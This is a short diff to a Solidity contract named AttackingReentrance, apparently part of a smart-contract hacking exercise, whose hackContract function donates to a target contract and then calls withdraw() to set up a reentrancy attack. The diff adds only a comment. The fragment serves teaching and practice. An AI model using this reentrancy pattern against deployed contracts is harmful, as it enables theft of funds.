@@ -14,6 +14,7 @@ contract AttackingReentrance {
     function hackContract() external {
         // Code me!
         reentranceContract.donate{value: address(this).balance}(address(this));
+        // fallback without an payable ether contract
         reentranceContract.withdraw();
     }
 
